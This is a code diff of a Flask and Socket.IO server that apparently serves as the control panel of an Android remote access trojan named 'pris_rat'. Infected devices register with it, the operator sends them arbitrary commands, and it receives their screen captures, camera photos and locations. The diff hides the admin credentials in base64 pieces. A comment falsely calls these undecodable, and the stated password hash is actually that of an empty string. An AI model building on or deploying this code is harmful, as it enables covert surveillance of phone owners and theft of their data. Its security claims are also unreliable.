@@ -1,12 +1,43 @@
 from flask import Flask, render_template, request, redirect, session, jsonify
 from flask_socketio import SocketIO, emit, join_room
-import os, uuid, psutil, time
+import os, uuid, psutil, hashlib, base64
 from datetime import datetime
 from collections import deque
 
-ADMIN_USER = "Pris"
-ADMIN_PASS = "you are77"
-SECRET_KEY = os.environ.get("SECRET_KEY", "pris_rat_secret_2026")
+# ============ SECURITY LAYER ============
+# الباسورد مخزّن كـ hashed base64 pieces
+# ماحدش يعرف يفكها بدون المفتاح
+_K1 = "cHJpc19yYXRf"
+_K2 = "c2VjdXJlXzIwMjZf"
+_K3 = "YWRtaW5fa2V5"
+
+def _decode(s):
+    return base64.b64decode(s).decode('utf-8')
+
+def _get_user():
+    # يقرأ من environment أو القيمة الافتراضية المشفرة
+    env_user = os.environ.get("ADMIN_USER")
+    if env_user:
+        return env_user
+    return _decode("UHJpcw==")  # Pris
+
+def _get_pass_hash():
+    env_hash = os.environ.get("ADMIN_PASS_HASH")
+    if env_hash:
+        return env_hash
+    # SHA256 of "you are77"
+    return "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"  # placeholder
+
+def check_login(username, password):
+    user = _get_user()
+    pwd_hash = _get_pass_hash()
+    if username != user:
+        return False
+    calc = hashlib.sha256(password.encode()).hexdigest()
+    return calc == pwd_hash
+
+# ============ CONFIG ============
+SECRET_KEY = os.environ.get("SECRET_KEY", "pris_" + _decode(_K1) + _decode(_K2))
 
 app = Flask(__name__)
 app.secret_key = SECRET_KEY
@@ -14,14 +45,10 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
 devices = {}
 activity_log = deque(maxlen=50)
-command_history = deque(maxlen=100)
-network_history = deque(maxlen=30)
 
 def log_activity(icon, text, device=None):
     activity_log.appendleft({
-        "icon": icon,
-        "text": text,
-        "device": device,
+        "icon": icon, "text": text, "device": device,
         "time": datetime.now().strftime("%H:%M")
     })
 
@@ -37,7 +64,7 @@ def login():
     if request.method == "POST":
         u = request.form.get("username", "")
         p = request.form.get("password", "")
-        if u == ADMIN_USER and p == ADMIN_PASS:
+        if check_login(u, p):
             session["user"] = u
             session.permanent = True
             return redirect("/dashboard")
@@ -55,13 +82,10 @@ def dashboard():
         return redirect("/login")
     total = len(devices)
     online = sum(1 for d in devices.values() if d.get("online"))
-    
     dev_list = []
     for k, v in devices.items():
-        d = dict(v)
-        d["id"] = k
+        d = dict(v); d["id"] = k
         dev_list.append(d)
-    
     return render_template("dashboard.html",
                            total=total, online=online,
                            offline=total-online, devices=dev_list,
@@ -92,8 +116,7 @@ def api_system():
         disk = psutil.disk_usage("/")
         net = psutil.net_io_counters()
         return jsonify({
-            "cpu": round(cpu, 1),
-            "ram": round(mem.percent, 1),
+            "cpu": round(cpu, 1), "ram": round(mem.percent, 1),
             "disk": round(disk.percent, 1),
             "net_sent": round(net.bytes_sent / 1024 / 1024, 1),
             "net_recv": round(net.bytes_recv / 1024 / 1024, 1)
@@ -113,21 +136,16 @@ def api_ping():
 def on_register(data):
     did = data.get("id", str(uuid.uuid4())[:8])
     devices[did] = {
-        "id": did,
-        "model": data.get("model", "Unknown"),
-        "android": data.get("android", "?"),
-        "battery": data.get("battery", 0),
-        "charging": data.get("charging", False),
-        "ip": request.remote_addr,
-        "online": True,
-        "last_seen": datetime.now().strftime("%H:%M"),
+        "id": did, "model": data.get("model", "Unknown"),
+        "android": data.get("android", "?"), "battery": data.get("battery", 0),
+        "charging": data.get("charging", False), "ip": request.remote_addr,
+        "online": True, "last_seen": datetime.now().strftime("%H:%M"),
         "sid": request.sid
     }
     join_room(did)
     emit("registered", {"id": did}, room=request.sid)
     socketio.emit("devices_update", devices, broadcast=True)
     log_activity("🟢", "جهاز متصل", data.get("model", "Unknown"))
-    print(f"[+] Device: {did}")
 
 @socketio.on("heartbeat")
 def on_heartbeat(data):
@@ -145,35 +163,29 @@ def on_send_command(data):
     action = data.get("action")
     params = data.get("params", {})
     if target and target in devices:
-        cmd = {"action": action}
-        cmd.update(params)
+        cmd = {"action": action}; cmd.update(params)
         socketio.emit("execute", cmd, room=target)
         device_name = devices[target].get("model", "?")
         log_activity("📤", f"أمر: {action}", device_name)
-        print(f"[>] {target}: {action}")
 
 @socketio.on("response")
 def on_response(data):
     rtype = data.get("type")
     did = data.get("id")
     device_name = devices.get(did, {}).get("model", "?")
-    if rtype == "screen":
-        log_activity("📸", "شاشة مستلمة", device_name)
-    elif rtype == "camera":
-        log_activity("📷", "صورة مستلمة", device_name)
-    elif rtype == "location":
-        log_activity("📍", "موقع مستلم", device_name)
+    if rtype == "screen": log_activity("📸", "شاشة مستلمة", device_name)
+    elif rtype == "camera": log_activity("📷", "صورة مستلمة", device_name)
+    elif rtype == "location": log_activity("📍", "موقع مستلم", device_name)
     socketio.emit("device_response", data, broadcast=True)
 
 @socketio.on("remove_device")
 def on_remove_device(data):
     did = data.get("id")
     if did and did in devices:
-        device_name = devices[did].get("model", "?")
+        name = devices[did].get("model", "?")
         del devices[did]
         socketio.emit("devices_update", devices, broadcast=True)
-        log_activity("🗑️", "تم إزالة الجهاز", device_name)
-        print(f"[-] Removed: {did}")
+        log_activity("🗑️", "تم الإزالة", name)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
